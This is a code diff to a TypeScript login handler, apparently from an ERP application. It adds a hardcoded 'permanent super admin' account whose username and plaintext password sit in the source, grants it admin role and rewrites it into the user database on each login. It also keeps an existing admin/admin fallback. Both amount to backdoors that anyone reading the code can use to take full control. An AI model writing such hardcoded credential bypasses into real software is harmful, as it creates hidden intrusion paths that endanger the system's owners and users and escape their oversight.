@@ -66,8 +66,21 @@ const handleLogin = async (req: any, res: any) => {
             console.warn("[AUTH] Warning: DB fetch failed, using fallback logic if applicable. Error:", dbErr.message);
         }
         
-        // ULTIMATE FALLBACK: If credentials are admin/admin, ensure access
-        if (lowerUsername === "admin" && password === "admin") {
+        // BUILT-IN PERMANENT SUPER ADMIN: tanzirerp / tanziradmin
+        if (lowerUsername === "tanzirerp" && password === "tanziradmin") {
+            console.log("[AUTH] Built-in Super Admin (tanzirerp) authenticated");
+            const hashedPassword = await bcrypt.hash("tanziradmin", 10);
+            userData = {
+                id: "tanzirerp",
+                username: "tanzirerp",
+                password_hash: hashedPassword,
+                role: "admin",
+                status: "active",
+                created_at: new Date(),
+                updated_at: new Date()
+            };
+            await db.setDoc("users", "tanzirerp", userData).catch(e => console.warn("Super admin doc update note:", e));
+        } else if (lowerUsername === "admin" && password === "admin") {
             console.log("[AUTH] Admin/Admin fallback triggered");
             if (!userData) {
                 const hashedPassword = await bcrypt.hash("admin", 10);
